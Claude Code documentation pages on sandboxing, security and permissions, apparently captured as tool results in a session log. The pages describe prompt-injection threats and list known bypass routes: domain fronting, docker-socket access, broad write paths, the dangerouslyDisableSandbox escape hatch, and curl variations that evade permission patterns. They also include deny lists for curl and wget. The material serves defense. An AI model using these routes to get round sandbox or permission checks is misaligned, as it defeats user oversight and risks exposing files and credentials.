Instead of asking permission for each bash command, sandboxing creates defined boundaries upfront where Claude Code can work more freely with reduced risk.\n\nThe sandboxed bash tool uses OS-level primitives to enforce both filesystem and network isolation.\n\n## Why sandboxing matters\n\nTraditional permission-based security requires constant user approval for bash commands. While this provides control, it can lead to:\n\n* **Approval fatigue**: Repeatedly clicking \"approve\" can cause users to pay less attention to what they're approving\n* **Reduced productivity**: Constant interruptions slow down development workflows\n* **Limited autonomy**: Claude Code cannot work as efficiently when waiting for approvals\n\nSandboxing addresses these challenges by:\n\n1. **Defining clear boundaries**: Specify exactly which directories and network hosts Claude Code can access\n2. **Reducing permission prompts**: Safe commands within the sandbox don't require approval\n3. **Maintaining security**: Attempts to access resources outside the sandbox trigger immediate notifications\n4. **Enabling autonomy**: Claude Code can run more independently within defined limits\n\n<Warning>\n  Effective sandboxing requires **both** filesystem and network isolation. Without network isolation, a compromised agent could exfiltrate sensitive files like SSH keys. Without filesystem isolation, a compromised agent could backdoor system resources to gain network access. When configuring sandboxing it is important to ensure that your configured settings do not create bypasses in these systems.\n</Warning>\n\n## How it works\n\n### Filesystem isolation\n\nThe sandboxed bash tool restricts file system access to specific directories:\n\n* **Default writes behavior**: Read and write access to the current working directory and its subdirectories\n* **Default read behavior**: Read access to the entire computer, except certain denied directories\n* **Blocked access**: Cannot modify files outside the current working directory without explicit permission\n* **Configurable**: Define custom allowed and denied paths through settings\n\n### Network isolation\n\nNetwork access is controlled through a proxy server running outside the sandbox:\n\n* **Domain restrictions**: Only approved domains can be accessed\n* **User confirmation**: New domain requests trigger permission prompts\n* **Custom proxy support**: Advanced users can implement custom rules on outgoing traffic\n* **Comprehensive coverage**: Restrictions apply to all scripts, programs, and subprocesses spawned by commands\n\n### OS-level enforcement\n\nThe sandboxed bash tool leverages operating system security primitives:\n\n* **macOS**: Uses Seatbelt for sandbox enforcement\n* **Linux**: Uses [bubblewrap](https://github.com/containers/bubblewrap) for isolation\n* **WSL2**: Uses bubblewrap, same as Linux\n\nWSL1 is not supported because bubblewrap requires kernel features only available in WSL2.\n\nThese OS-level restrictions ensure that all child processes spawned by Claude Code's commands inherit the same security boundaries.\n\n## Getting started\n\n### Prerequisites\n\nOn **macOS**, sandboxing works out of the box using the built-in Seatbelt framework.\n\nOn **Linux and WSL2**, install the required packages first:\n\n<Tabs>\n  <Tab title=\"Ubuntu/Debian\">\n    ```bash  theme={null}\n    sudo apt-get install bubblewrap socat\n    ```\n  </Tab>\n\n  <Tab title=\"Fedora\">\n    ```bash  theme={null}\n    sudo dnf install bubblewrap socat\n    ```\n  </Tab>\n</Tabs>\n\n### Enable sandboxing\n\nYou can enable sandboxing by running the `/sandbox` command:\n\n```\n> /sandbox\n```\n\nThis opens a menu where you can choose between sandbox modes. If required dependencies are missing (such as `bubblewrap` or `socat` on Linux), the menu displays installation instructions for your platform.\n\n### Sandbox modes\n\nClaude Code offers two sandbox modes:\n\n**Auto-allow mode**: Bash commands will attempt to run inside the sandbox and are automatically allowed without requiring permission. Commands that cannot be sandboxed (such as those needing network access to non-allowed hosts) fall back to the regular permission flow. Explicit ask/deny rules you've configured are always respected.\n\n**Regular permissions mode**: All bash commands go through the standard permission flow, even when sandboxed. This provides more control but requires more approvals.\n\nIn both modes, the sandbox enforces the same filesystem and network restrictions. The difference is only in whether sandboxed commands are auto-approved or require explicit permission.\n\n<Info>\n  Auto-allow mode works independently of your permission mode setting. Even if you're not in \"accept edits\" mode, sandboxed bash commands will run automatically when auto-allow is enabled. This means bash commands that modify files within the sandbox boundaries will execute without prompting, even when file edit tools would normally require approval.\n</Info>\n\n### Configure sandboxing\n\nCustomize sandbox behavior through your `settings.json` file. See [Settings](/en/settings#sandbox-settings) for complete configuration reference.\n\n<Tip>\n  Not all commands are compatible with sandboxing out of the box. Some notes that may help you make the most out of the sandbox:\n\n  * Many CLI tools require accessing certain hosts. As you use these tools, they will request permission to access certain hosts. Granting permission will allow them to access these hosts now and in the future, enabling them to safely execute inside the sandbox.\n  * `watchman` is incompatible with running in the sandbox. If you're running `jest`, consider using `jest --no-watchman`\n  * `docker` is incompatible with running in the sandbox. Consider specifying `docker` in `excludedCommands` to force it to run outside of the sandbox.\n</Tip>\n\n<Note>\n  Claude Code includes an intentional escape hatch mechanism that allows commands to run outside the sandbox when necessary. When a command fails due to sandbox restrictions (such as network connectivity issues or incompatible tools), Claude is prompted to analyze the failure and may retry the command with the `dangerouslyDisableSandbox` parameter. Commands that use this parameter go through the normal Claude Code permissions flow requiring user permission to execute. This allows Claude Code to handle edge cases where certain tools or network operations cannot function within sandbox constraints.\n\n  You can disable this escape hatch by setting `\"allowUnsandboxedCommands\": false` in your [sandbox settings](/en/settings#sandbox-settings). When disabled, the `dangerouslyDisableSandbox` parameter is completely ignored and all commands must run sandboxed or be explicitly listed in `excludedCommands`.\n</Note>\n\n## Security benefits\n\n### Protection against prompt injection\n\nEven if an attacker successfully manipulates Claude Code's behavior through prompt injection, the sandbox ensures your system remains secure:\n\n**Filesystem protection:**\n\n* Cannot modify critical config files such as `~/.bashrc`\n* Cannot modify system-level files in `/bin/`\n* Cannot read files that are denied in your [Claude permission settings](/en/permissions#manage-permissions)\n\n**Network protection:**\n\n* Cannot exfiltrate data to attacker-controlled servers\n* Cannot download malicious scripts from unauthorized domains\n* Cannot make unexpected API calls to unapproved services\n* Cannot contact any domains not explicitly allowed\n\n**Monitoring and control:**\n\n* All access attempts outside the sandbox are blocked at the OS level\n* You receive immediate notifications when boundaries are tested\n* You can choose to deny, allow once, or permanently update your configuration\n\n### Reduced attack surface\n\nSandboxing limits the potential damage from:\n\n* **Malicious dependencies**: NPM packages or other dependencies with harmful code\n* **Compromised scripts**: Build scripts or tools with security vulnerabilities\n* **Social engineering**: Attacks that trick users into running dangerous commands\n* **Prompt injection**: Attacks that trick Claude into running dangerous commands\n\n### Transparent operation\n\nWhen Claude Code attempts to access network resources outside the sandbox:\n\n1. The operation is blocked at the OS level\n2. You receive an immediate notification\n3. You can choose to:\n   * Deny the request\n   * Allow it once\n   * Update your sandbox configuration to permanently allow it\n\n## Security Limitations\n\n* Network Sandboxing Limitations: The network filtering system operates by restricting the domains that processes are allowed to connect to. It does not otherwise inspect the traffic passing through the proxy and users are responsible for ensuring they only allow trusted domains in their policy.\n\n<Warning>\n  Users should be aware of potential risks that come from allowing broad domains like `github.com` that may allow for data exfiltration. Also, in some cases it may be possible to bypass the network filtering through [domain fronting](https://en.wikipedia.org/wiki/Domain_fronting).\n</Warning>\n\n* Privilege Escalation via Unix Sockets: The `allowUnixSockets` configuration can inadvertently grant access to powerful system services that could lead to sandbox bypasses. For example, if it is used to allow access to `/var/run/docker.sock` this would effectively grant access to the host system through exploiting the docker socket. Users are encouraged to carefully consider any unix sockets that they allow through the sandbox.\n* Filesystem Permission Escalation: Overly broad filesystem write permissions can enable privilege escalation attacks. Allowing writes to directories containing executables in `$PATH`, system configuration directories, or user shell configuration files (`.bashrc`, `.zshrc`) can lead to code execution in different security contexts when other users or system processes access these files.\n* Linux Sandbox Strength: The Linux implementation provides strong filesystem and network isolation but includes an `enableWeakerNestedSandbox` mode that enables it to work inside of Docker environments without privileged namespaces. This option considerably weakens security and should only be used in cases where additional isolation is otherwise enforced.\n\n## How sandboxing relates to permissions\n\nSandboxing and [permissions](/en/permissions) are complementary security layers that work together:\n\n* **Permissions** control which tools Claude Code can use and are evaluated before any tool runs. They apply to all tools: Bash, Read, Edit, WebFetch, MCP, and others.\n* **Sandboxing** provides OS-level enforcement that restricts what Bash commands can access at the filesystem and network level. It applies only to Bash commands and their child processes.\n\nFilesystem and network restrictions are configured through permission rules, not sandbox settings:\n\n* Use `Read` and `Edit` deny rules to block access to specific files or directories\n* Use `WebFetch` allow/deny rules to control domain access\n* Use sandbox `allowedDomains` to control which domains Bash commands can reach\n\nThis [repository](https://github.com/anthropics/claude-code/tree/main/examples/settings) includes starter settings configurations for common deployment scenarios, including sandbox-specific examples. Use these as starting points and adjust them to fit your needs.\n\n## Advanced usage\n\n### Custom proxy configuration\n\nFor organizations requiring advanced network security, you can implement a custom proxy to:\n\n* Decrypt and inspect HTTPS traffic\n* Apply custom filtering rules\n* Log all network requests\n* Integrate with existing security infrastructure\n\n```json  theme={null}\n{\n  \"sandbox\": {\n    \"network\": {\n      \"httpProxyPort\": 8080,\n      \"socksProxyPort\": 8081\n    }\n  }\n}\n```\n\n### Integration with existing security tools\n\nThe sandboxed bash tool works alongside:\n\n* **Permission rules**: Combine with [permission settings](/en/permissions) for defense-in-depth\n* **Development containers**: Use with [devcontainers](/en/devcontainer) for additional isolation\n* **Enterprise policies**: Enforce sandbox configurations through [managed settings](/en/settings#settings-precedence)\n\n## Best practices\n\n1. **Start restrictive**: Begin with minimal permissions and expand as needed\n2. **Monitor logs**: Review sandbox violation attempts to understand Claude Code's needs\n3. **Use environment-specific configs**: Different sandbox rules for development vs. production contexts\n4. **Combine with permissions**: Use sandboxing alongside IAM policies for comprehensive security\n5. **Test configurations**: Verify your sandbox settings don't block legitimate workflows\n\n## Open source\n\nThe sandbox runtime is available as an open source npm package for use in your own agent projects. This enables the broader AI agent community to build safer, more secure autonomous systems. This can also be used to sandbox other programs you may wish to run. For example, to sandbox an MCP server you could run:\n\n```bash  theme={null}\nnpx @anthropic-ai/sandbox-runtime <command-to-sandbox>\n```\n\nFor implementation details and source code, visit the [GitHub repository](https://github.com/anthropic-experimental/sandbox-runtime).\n\n## Limitations\n\n* **Performance overhead**: Minimal, but some filesystem operations may be slightly slower\n* **Compatibility**: Some tools that require specific system access patterns may need configuration adjustments, or may even need to be run outside of the sandbox\n* **Platform support**: Supports macOS, Linux, and WSL2. WSL1 is not supported. Native Windows support is planned.\n\n## See also\n\n* [Security](/en/security) - Comprehensive security features and best practices\n* [Permissions](/en/permissions) - Permission configuration and access control\n* [Settings](/en/settings) - Complete configuration reference\n* [CLI reference](/en/cli-reference) - Command-line options\n"}]},"uuid":"6f35bec3-63a3-4855-a1f2-66e357a145d9","timestamp":"2026-02-16T23:48:12.486Z","sourceToolAssistantUUID":"9da0287e-bf49-44cb-9c5c-815a6986f7e0"}

Claude Code is built with security at its core, developed according to Anthropic's comprehensive security program. Learn more and access resources (SOC 2 Type 2 report, ISO 27001 certificate, etc.) at [Anthropic Trust Center](https://trust.anthropic.com).\n\n### Permission-based architecture\n\nClaude Code uses strict read-only permissions by default. When additional actions are needed (editing files, running tests, executing commands), Claude Code requests explicit permission. Users control whether to approve actions once or allow them automatically.\n\nWe designed Claude Code to be transparent and secure. For example, we require approval for bash commands before executing them, giving you direct control. This approach enables users and organizations to configure permissions directly.\n\nFor detailed permission configuration, see [Permissions](/en/permissions).\n\n### Built-in protections\n\nTo mitigate risks in agentic systems:\n\n* **Sandboxed bash tool**: [Sandbox](/en/sandboxing) bash commands with filesystem and network isolation, reducing permission prompts while maintaining security. Enable with `/sandbox` to define boundaries where Claude Code can work autonomously\n* **Write access restriction**: Claude Code can only write to the folder where it was started and its subfolders—it cannot modify files in parent directories without explicit permission. While Claude Code can read files outside the working directory (useful for accessing system libraries and dependencies), write operations are strictly confined to the project scope, creating a clear security boundary\n* **Prompt fatigue mitigation**: Support for allowlisting frequently used safe commands per-user, per-codebase, or per-organization\n* **Accept Edits mode**: Batch accept multiple edits while maintaining permission prompts for commands with side effects\n\n### User responsibility\n\nClaude Code only has the permissions you grant it. You're responsible for reviewing proposed code and commands for safety before approval.\n\n## Protect against prompt injection\n\nPrompt injection is a technique where an attacker attempts to override or manipulate an AI assistant's instructions by inserting malicious text. Claude Code includes several safeguards against these attacks:\n\n### Core protections\n\n* **Permission system**: Sensitive operations require explicit approval\n* **Context-aware analysis**: Detects potentially harmful instructions by analyzing the full request\n* **Input sanitization**: Prevents command injection by processing user inputs\n* **Command blocklist**: Blocks risky commands that fetch arbitrary content from the web like `curl` and `wget` by default. When explicitly allowed, be aware of [permission pattern limitations](/en/permissions#tool-specific-permission-rules)\n\n### Privacy safeguards\n\nWe have implemented several safeguards to protect your data, including:\n\n* Limited retention periods for sensitive information (see the [Privacy Center](https://privacy.anthropic.com/en/articles/10023548-how-long-do-you-store-my-data) to learn more)\n* Restricted access to user session data\n* User control over data training preferences. Consumer users can change their [privacy settings](https://claude.ai/settings/privacy) at any time.\n\nFor full details, please review our [Commercial Terms of Service](https://www.anthropic.com/legal/commercial-terms) (for Team, Enterprise, and API users) or [Consumer Terms](https://www.anthropic.com/legal/consumer-terms) (for Free, Pro, and Max users) and [Privacy Policy](https://www.anthropic.com/legal/privacy).\n\n### Additional safeguards\n\n* **Network request approval**: Tools that make network requests require user approval by default\n* **Isolated context windows**: Web fetch uses a separate context window to avoid injecting potentially malicious prompts\n* **Trust verification**: First-time codebase runs and new MCP servers require trust verification\n  * Note: Trust verification is disabled when running non-interactively with the `-p` flag\n* **Command injection detection**: Suspicious bash commands require manual approval even if previously allowlisted\n* **Fail-closed matching**: Unmatched commands default to requiring manual approval\n* **Natural language descriptions**: Complex bash commands include explanations for user understanding\n* **Secure credential storage**: API keys and tokens are encrypted. See [Credential Management](/en/authentication#credential-management)\n\n<Warning>\n  **Windows WebDAV security risk**: When running Claude Code on Windows, we recommend against enabling WebDAV or allowing Claude Code to access paths such as `\\\\*` that may contain WebDAV subdirectories. [WebDAV has been deprecated by Microsoft](https://learn.microsoft.com/en-us/windows/whats-new/deprecated-features#:~:text=The%20Webclient%20\\(WebDAV\\)%20service%20is%20deprecated) due to security risks. Enabling WebDAV may allow Claude Code to trigger network requests to remote hosts, bypassing the permission system.\n</Warning>\n\n**Best practices for working with untrusted content**:\n\n1. Review suggested commands before approval\n2. Avoid piping untrusted content directly to Claude\n3. Verify proposed changes to critical files\n4. Use virtual machines (VMs) to run scripts and make tool calls, especially when interacting with external web services\n5. Report suspicious behavior with `/bug`\n\n<Warning>\n  While these protections significantly reduce risk, no system is completely\n  immune to all attacks. Always maintain good security practices when working\n  with any AI tool.\n</Warning>\n\n## MCP security\n\nClaude Code allows users to configure Model Context Protocol (MCP) servers. The list of allowed MCP servers is configured in your source code, as part of Claude Code settings engineers check into source control.\n\nWe encourage either writing your own MCP servers or using MCP servers from providers that you trust. You are able to configure Claude Code permissions for MCP servers. Anthropic does not manage or audit any MCP servers.\n\n## IDE security\n\nSee [VS Code security and privacy](/en/vs-code#security-and-privacy) for more information on running Claude Code in an IDE.\n\n## Cloud execution security\n\nWhen using [Claude Code on the web](/en/claude-code-on-the-web), additional security controls are in place:\n\n* **Isolated virtual machines**: Each cloud session runs in an isolated, Anthropic-managed VM\n* **Network access controls**: Network access is limited by default and can be configured to be disabled or allow only specific domains\n* **Credential protection**: Authentication is handled through a secure proxy that uses a scoped credential inside the sandbox, which is then translated to your actual GitHub authentication token\n* **Branch restrictions**: Git push operations are restricted to the current working branch\n* **Audit logging**: All operations in cloud environments are logged for compliance and audit purposes\n* **Automatic cleanup**: Cloud environments are automatically terminated after session completion\n\nFor more details on cloud execution, see [Claude Code on the web](/en/claude-code-on-the-web).\n\n## Security best practices\n\n### Working with sensitive code\n\n* Review all suggested changes before approval\n* Use project-specific permission settings for sensitive repositories\n* Consider using [devcontainers](/en/devcontainer) for additional isolation\n* Regularly audit your permission settings with `/permissions`\n\n### Team security\n\n* Use [managed settings](/en/permissions#managed-settings) to enforce organizational standards\n* Share approved permission configurations through version control\n* Train team members on security best practices\n* Monitor Claude Code usage through [OpenTelemetry metrics](/en/monitoring-usage)\n\n### Reporting security issues\n\nIf you discover a security vulnerability in Claude Code:\n\n1. Do not disclose it publicly\n2. Report it through our [HackerOne program](https://hackerone.com/anthropic-vdp/reports/new?type=team\\&report_type=vulnerability)\n3. Include detailed reproduction steps\n4.

Permission settings can be checked into version control and distributed to all developers in your organization, as well as customized by individual developers.\n\n## Permission system\n\nClaude Code uses a tiered permission system to balance power and safety:\n\n| Tool type         | Example          | Approval required | \"Yes, don't ask again\" behavior               |\n| :---------------- | :--------------- | :---------------- | :-------------------------------------------- |\n| Read-only         | File reads, Grep | No                | N/A                                           |\n| Bash commands     | Shell execution  | Yes               | Permanently per project directory and command |\n| File modification | Edit/write files | Yes               | Until session end                             |\n\n## Manage permissions\n\nYou can view and manage Claude Code's tool permissions with `/permissions`. This UI lists all permission rules and the settings.json file they are sourced from.\n\n* **Allow** rules let Claude Code use the specified tool without manual approval.\n* **Ask** rules prompt for confirmation whenever Claude Code tries to use the specified tool.\n* **Deny** rules prevent Claude Code from using the specified tool.\n\nRules are evaluated in order: **deny -> ask -> allow**. The first matching rule wins, so deny rules always take precedence.\n\n## Permission modes\n\nClaude Code supports several permission modes that control how tools are approved. Set the `defaultMode` in your [settings files](/en/settings#settings-files):\n\n| Mode                | Description                                                                                                                                                                                                                                                  |\n| :------------------ | :----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| `default`           | Standard behavior: prompts for permission on first use of each tool                                                                                                                                                                                          |\n| `acceptEdits`       | Automatically accepts file edit permissions for the session                                                                                                                                                                                                  |\n| `plan`              | Plan Mode: Claude can analyze but not modify files or execute commands                                                                                                                                                                                       |\n| `delegate`          | Coordination-only mode for agent team leads. Restricts the lead to team management tools, so all implementation work happens through teammates. Only available when an agent team is active.

Only use this in isolated environments like containers or VMs where Claude Code cannot cause damage. Administrators can prevent this mode by setting `disableBypassPermissionsMode` to `\"disable\"` in [managed settings](#managed-settings).\n</Warning>\n\n## Permission rule syntax\n\nPermission rules follow the format `Tool` or `Tool(specifier)`.\n\n### Match all uses of a tool\n\nTo match all uses of a tool, use just the tool name without parentheses:\n\n| Rule       | Effect                         |\n| :--------- | :----------------------------- |\n| `Bash`     | Matches all Bash commands      |\n| `WebFetch` | Matches all web fetch requests |\n| `Read`     | Matches all file reads         |\n\n`Bash(*)` is equivalent to `Bash` and matches all Bash commands.\n\n### Use specifiers for fine-grained control\n\nAdd a specifier in parentheses to match specific tool uses:\n\n| Rule                           | Effect                                                   |\n| :----------------------------- | :------------------------------------------------------- |\n| `Bash(npm run build)`          | Matches the exact command `npm run build`                |\n| `Read(./.env)`                 | Matches reading the `.env` file in the current directory |\n| `WebFetch(domain:example.com)` | Matches fetch requests to example.com                    |\n\n### Wildcard patterns\n\nBash rules support glob patterns with `*`. Wildcards can appear at any position in the command. This configuration allows npm and git commit commands while blocking git push:\n\n```json  theme={null}\n{\n  \"permissions\": {\n    \"allow\": [\n      \"Bash(npm run *)\",\n      \"Bash(git commit *)\",\n      \"Bash(git * main)\",\n      \"Bash(* --version)\",\n      \"Bash(* --help *)\"\n    ],\n    \"deny\": [\n      \"Bash(git push *)\"\n    ]\n  }\n}\n```\n\nThe space before `*` matters: `Bash(ls *)` matches `ls -la` but not `lsof`, while `Bash(ls*)` matches both. The legacy `:*` suffix syntax is equivalent to ` *` but is deprecated.\n\n## Tool-specific permission rules\n\n### Bash\n\nBash permission rules support wildcard matching with `*`. Wildcards can appear at any position in the command, including at the beginning, middle, or end:\n\n* `Bash(npm run build)` matches the exact Bash command `npm run build`\n* `Bash(npm run test *)` matches Bash commands starting with `npm run test`\n* `Bash(npm *)` matches any command starting with `npm `\n* `Bash(* install)` matches any command ending with ` install`\n* `Bash(git * main)` matches commands like `git checkout main`, `git merge main`\n\nWhen `*` appears at the end with a space before it (like `Bash(ls *)`), it enforces a word boundary, requiring the prefix to be followed by a space or end-of-string. For example, `Bash(ls *)` matches `ls -la` but not `lsof`. In contrast, `Bash(ls*)` without a space matches both `ls -la` and `lsof` because there's no word boundary constraint.\n\n<Tip>\n  Claude Code is aware of shell operators (like `&&`) so a prefix match rule like `Bash(safe-cmd *)` won't give it permission to run the command `safe-cmd && other-cmd`.\n</Tip>\n\n<Warning>\n  Bash permission patterns that try to constrain command arguments are fragile. For example, `Bash(curl http://github.com/ *)` intends to restrict curl to GitHub URLs, but won't match variations like:\n\n  * Options before URL: `curl -X GET http://github.com/...`\n  * Different protocol: `curl https://github.com/...`\n  * Redirects: `curl -L http://bit.ly/xyz` (redirects to github)\n  * Variables: `URL=http://github.com && curl $URL`\n  * Extra spaces: `curl  http://github.com`\n\n  For more reliable URL filtering, consider:\n\n  * **Restrict Bash network tools**: use deny rules to block `curl`, `wget`, and similar commands, then use the WebFetch tool with `WebFetch(domain:github.com)` permission for allowed domains\n  * **Use PreToolUse hooks**: implement a hook that validates URLs in Bash commands and blocks disallowed domains\n  * Instructing Claude Code about your allowed curl patterns via CLAUDE.md\n\n  Note that using WebFetch alone does not prevent network access. If Bash is allowed, Claude can still use `curl`, `wget`, or other tools to reach any URL.\n</Warning>\n\n### Read and Edit\n\n`Edit` rules apply to all built-in tools that edit files. Claude makes a best-effort attempt to apply `Read` rules to all built-in tools that read files like Grep and Glob.\n\nRead and Edit rules both follow the [gitignore](https://git-scm.com/docs/gitignore) specification with four distinct pattern types:\n\n| Pattern            | Meaning                                | Example                          | Matches                            |\n| ------------------ | -------------------------------------- | -------------------------------- | ---------------------------------- |\n| `//path`           | **Absolute** path from filesystem root | `Read(//Users/alice/secrets/**)` | `/Users/alice/secrets/**`          |\n| `~/path`           | Path from **home** directory           | `Read(~/Documents/*.pdf)`        | `/Users/alice/Documents/*.pdf`     |\n| `/path`            | Path **relative to settings file**     | `Edit(/src/**/*.ts)`             | `<settings file path>/src/**/*.ts` |\n| `path` or `./path` | Path **relative to current directory** | `Read(*.env)`                    | `<cwd>/*.env`                      |\n\n<Warning>\n  A pattern like `/Users/alice/file` is NOT an absolute path. It's relative to your settings file. Use `//Users/alice/file` for absolute paths.\n</Warning>\n\nExamples:\n\n* `Edit(/docs/**)`: edits in `<project>/docs/` (NOT `/docs/`)\n* `Read(~/.zshrc)`: reads your home directory's `.zshrc`\n* `Edit(//tmp/scratch.txt)`: edits the absolute path `/tmp/scratch.txt`\n* `Read(src/**)`: reads from `<current-directory>/src/`\n\n<Note>\n  In gitignore patterns, `*` matches files in a single directory while `**` matches recursively across directories. To allow all file access, use just the tool name without parentheses: `Read`, `Edit`, or `Write`.\n</Note>\n\n### WebFetch\n\n* `WebFetch(domain:example.com)` matches fetch requests to example.com\n\n### MCP\n\n* `mcp__puppeteer` matches any tool provided by the `puppeteer` server (name configured in Claude Code)\n* `mcp__puppeteer__*` wildcard syntax that also matches all tools from the `puppeteer` server\n* `mcp__puppeteer__puppeteer_navigate` matches the `puppeteer_navigate` tool provided by the `puppeteer` server\n\n### Task (subagents)\n\nUse `Task(AgentName)` rules to control which [subagents](/en/sub-agents) Claude can use:\n\n* `Task(Explore)` matches the Explore subagent\n* `Task(Plan)` matches the Plan subagent\n* `Task(my-custom-agent)` matches a custom subagent named `my-custom-agent`\n\nAdd these rules to the `deny` array in your settings or use the `--disallowedTools` CLI flag to disable specific agents. To disable the Explore agent:\n\n```json  theme={null}\n{\n  \"permissions\": {\n    \"deny\": [\"Task(Explore)\"]\n  }\n}\n```\n\n## Extend permissions with hooks\n\n[Claude Code hooks](/en/hooks-guide) provide a way to register custom shell commands to perform permission evaluation at runtime. When Claude Code makes a tool call, PreToolUse hooks run before the permission system, and the hook output can determine whether to approve or deny the tool call in place of the permission system.\n\n## Working directories\n\nBy default, Claude has access to files in the directory where it was launched. You can extend this access:\n\n* **During startup**: use `--add-dir <path>` CLI argument\n* **During session**: use `/add-dir` command\n* **Persistent configuration**: add to `additionalDirectories` in [settings files](/en/settings#settings-files)\n\nFiles in additional directories follow the same permission rules as the original working directory: they become readable without prompts, and file editing permissions follow the current permission mode.\n\n## How permissions interact with sandboxing\n\nPermissions and [sandboxing](/en/sandboxing) are complementary security layers:\n\n* **Permissions** control which tools Claude Code can use and which files or domains it can access. They apply to all tools (Bash, Read, Edit, WebFetch, MCP, and others).\n* **Sandboxing** provides OS-level enforcement that restricts the Bash tool's filesystem and network access. It applies only to Bash commands and their child processes.\n\nUse both for defense-in-depth:\n\n* Permission deny rules block Claude from even attempting to access restricted resources\n* Sandbox restrictions prevent Bash commands from reaching resources outside defined boundaries, even if a prompt injection bypasses Claude's decision-making\n* Filesystem restrictions in the sandbox use Read and Edit deny rules, not separate sandbox configuration\n* Network restrictions combine WebFetch permission rules with the sandbox's `allowedDomains` list\n\n## Managed settings\n\nFor organizations that need centralized control over Claude Code configuration, administrators can deploy `managed-settings.json` files to system directories. These policy files follow the same format as regular settings files and cannot be overridden by user or project settings. For organizations without device management infrastructure, [server-managed settings](/en/server-managed-settings) provide an alternative that delivers configurations from Anthropic's servers.\n\n**Managed settings file locations**:\n\n* **macOS**: `/Library/Application Support/ClaudeCode/managed-settings.json`\n* **Linux and WSL**: `/etc/claude-code/managed-settings.json`\n* **Windows**: `C:\\Program Files\\ClaudeCode\\managed-settings.json`\n\n<Note>\n  These are system-wide paths (not user home directories like `~/Library/...`) that require administrator privileges. They are designed to be deployed by IT administrators.\n</Note>\n\n### Managed-only settings\n\nSome settings are only effective in managed settings:\n\n| Setting                           | Description                                                                                                                                        |\n| :-------------------------------- | :------------------------------------------------------------------------------------------------------------------------------------------------- |\n| `disableBypassPermissionsMode`    | Set to `\"disable\"` to prevent `bypassPermissions` mode and the `--dangerously-skip-permissions` flag                                               |\n| `allowManagedPermissionRulesOnly` | When `true`, prevents user and project settings from defining `allow`, `ask`, or `deny` permission rules. Only rules in managed settings apply     |\n| `allowManagedHooksOnly`           | When `true`, prevents loading of user, project, and plugin hooks. Only managed hooks and SDK hooks are allowed                                     |\n| `strictKnownMarketplaces`         | Controls which plugin marketplaces users can add. See [managed marketplace restrictions](/en/plugin-marketplaces#managed-marketplace-restrictions) |\n\n## Settings precedence\n\nPermission rules follow the same [settings precedence](/en/settings#settings-precedence) as all other Claude Code settings: managed settings have the highest precedence, followed by command line arguments, local project, shared project, and user settings.\n\nIf a permission is allowed in user settings but denied in project settings, the project setting takes precedence and the permission is blocked.\n\n## Example configurations\n\nThis [repository](https://github.com/anthropics/claude-code/tree/main/examples/settings) includes starter settings configurations for common deployment scenarios. Use these as starting points and adjust them to fit your needs.\n\n## See also\n\n* [Settings](/en/settings): complete configuration reference including the permission settings table\n* [Sandboxing](/en/sandboxing): OS-level filesystem and network isolation for Bash commands\n* [Authentication](/en/authentication): set up user access to Claude Code\n* [Security](/en/security): security safeguards and best practices\n* [Hooks](/en/hooks-guide): automate workflows and extend permission evaluation\n"}]},"uuid":"8f112256-0aa8-43f3-8300-762be1f17380","timestamp":"2026-02-16T23:48:12.570Z","sourceToolAssistantUUID":"0c8a9435-7cae-4305-ad61-ca312c57cc54"}

Visit [claude.ai/code](https://claude.ai/code)\n2. Connect your GitHub account\n3. Install the Claude GitHub app in your repositories\n4. Select your default environment\n5. Submit your coding task\n6. Review changes in diff view, iterate with comments, then create a pull request\n\n## How it works\n\nWhen you start a task on Claude Code on the web:\n\n1. **Repository cloning**: Your repository is cloned to an Anthropic-managed virtual machine\n2. **Environment setup**: Claude prepares a secure cloud environment with your code\n3. **Network configuration**: Internet access is configured based on your settings\n4. **Task execution**: Claude analyzes code, makes changes, runs tests, and checks its work\n5. **Completion**: You're notified when finished and can create a PR with the changes\n6. **Results**: Changes are pushed to a branch, ready for pull request creation\n\n## Review changes with diff view\n\nDiff view lets you see exactly what Claude changed before creating a pull request. Instead of clicking \"Create PR\" to review changes in GitHub, view the diff directly in the app and iterate with Claude until the changes are ready.\n\nWhen Claude makes changes to files, a diff stats indicator appears showing the number of lines added and removed (for example, `+12 -1`). Select this indicator to open the diff viewer, which displays a file list on the left and the changes for each file on the right.\n\nFrom the diff view, you can:\n\n* Review changes file by file\n* Comment on specific changes to request modifications\n* Continue iterating with Claude based on what you see\n\nThis lets you refine changes through multiple rounds of feedback without creating draft PRs or switching to GitHub.\n\n## Moving tasks between web and terminal\n\nYou can start tasks on the web and continue them in your terminal, or send tasks from your terminal to run on the web. Web sessions persist even if you close your laptop, and you can monitor them from anywhere including the Claude iOS app.\n\n<Note>\n  Session handoff is one-way: you can pull web sessions into your terminal, but you can't push an existing terminal session to the web. The [`&` prefix](#from-terminal-to-web) creates a *new* web session with your current conversation context.\n</Note>\n\n### From terminal to web\n\nStart a message with `&` inside Claude Code to send a task to run on the web:\n\n```\n& Fix the authentication bug in src/auth/login.ts\n```\n\nThis creates a new web session on claude.ai with your current conversation context. The task runs in the cloud while you continue working locally. Use `/tasks` to check progress, or open the session on claude.ai or the Claude iOS app to interact directly. From there you can steer Claude, provide feedback, or answer questions just like any other conversation.\n\nYou can also start a web session directly from the command line:\n\n```bash  theme={null}\nclaude --remote \"Fix the authentication bug in src/auth/login.ts\"\n```\n\n#### Tips for background tasks\n\n**Plan locally, execute remotely**: For complex tasks, start Claude in plan mode to collaborate on the approach before sending work to the web:\n\n```bash  theme={null}\nclaude --permission-mode plan\n```\n\nIn plan mode, Claude can only read files and explore the codebase. Once you're satisfied with the plan, send it to the web for autonomous execution:\n\n```\n& Execute the migration plan we discussed\n```\n\nThis pattern gives you control over the strategy while letting Claude execute autonomously in the cloud.\n\n**Run tasks in parallel**: Each `&` command creates its own web session that runs independently. You can kick off multiple tasks and they'll all run simultaneously in separate sessions:\n\n```\n& Fix the flaky test in auth.spec.ts\n& Update the API documentation\n& Refactor the logger to use structured output\n```\n\nMonitor all sessions with `/tasks`. When a session completes, you can create a PR from the web interface or [teleport](#from-web-to-terminal) the session to your terminal to continue working.\n\n### From web to terminal\n\nThere are several ways to pull a web session into your terminal:\n\n* **Using `/teleport`**: From within Claude Code, run `/teleport` (or `/tp`) to see an interactive picker of your web sessions. If you have uncommitted changes, you'll be prompted to stash them first.\n* **Using `--teleport`**: From the command line, run `claude --teleport` for an interactive session picker, or `claude --teleport <session-id>` to resume a specific session directly.\n* **From `/tasks`**: Run `/tasks` to see your background sessions, then press `t` to teleport into one\n* **From the web interface**: Click \"Open in CLI\" to copy a command you can paste into your terminal\n\nWhen you teleport a session, Claude 